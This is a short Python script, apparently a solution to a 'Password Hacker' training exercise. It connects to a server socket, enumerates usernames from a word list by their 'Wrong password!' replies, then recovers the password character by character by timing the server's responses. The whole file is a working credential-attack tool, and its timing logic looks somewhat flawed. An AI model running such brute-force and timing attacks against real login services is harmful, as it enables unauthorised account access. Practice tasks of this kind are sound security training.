import sys, socket, json
from datetime import datetime

host, port = sys.argv [1:]


def check_user():
    """
        Find User
    """
    with open("//home//yasin//PycharmProjects//Password Hacker//Password Hacker//task//hacking//logins.txt") as f:
        user_list = map(lambda elem: elem.strip(), f.readlines())
        for user in user_list:
            client.send(json.dumps({"login": user, "password": ' '}).encode())
            if json.loads(client.recv(1024).decode()) ['result'] == 'Wrong password!':
                return user


def check_password(user=None):
    """
        Find Password
    """
    b = True
    abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    password = ""
    while b:
        for i in abc:
            try:
                start = datetime.now().microsecond
                client.send(json.dumps({"login": user, "password": password + i}).encode())
                response = (json.loads(client.recv(1024).decode())['result'] == 'Wrong password!')
                finish = datetime.now().microsecond
                if finish-start > 10000:
                    password += i
            except:
                password += abc[abc.index(i)-1]
                print(json.dumps({"login": user, "password": password}))
                b = False
                break

with socket.socket() as client:
    client.connect((host, int(port)))
    user = check_user()
    check_password(user=user)
